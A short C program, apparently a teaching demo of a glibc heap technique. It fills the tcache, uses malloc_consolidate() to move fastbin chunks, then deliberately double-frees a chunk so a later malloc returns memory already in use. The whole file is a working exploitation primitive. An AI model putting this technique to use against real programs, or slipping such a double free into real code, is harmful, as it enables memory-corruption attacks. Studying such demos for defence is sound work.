#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void main() {

	printf("Fill up the tcache list, to force the fastbin usage.\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

	void* p1 = calloc(1,0x40);
  	void* p2 = calloc(1,0x40);

	printf("Subsequently, we allocated two chunks of the same size p1=%p p2=%p\n", p1, p2);
  	printf("Thus, freeing p1 and p2 will add them to the fastbin list!\n");
  	free(p1);
	free(p2);
  	void* p3 = malloc(0x400);

	printf("Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  	printf("Triggering the double free vulnerability!\n");
	free(p1);


	void *p4 = malloc(0x400);
	assert(p4 == p3);

	printf("The double free added p1 to the tcache, thus the next similar-size malloc will point to p3:\np3=%p, p4=%p\n",p3, p4);
}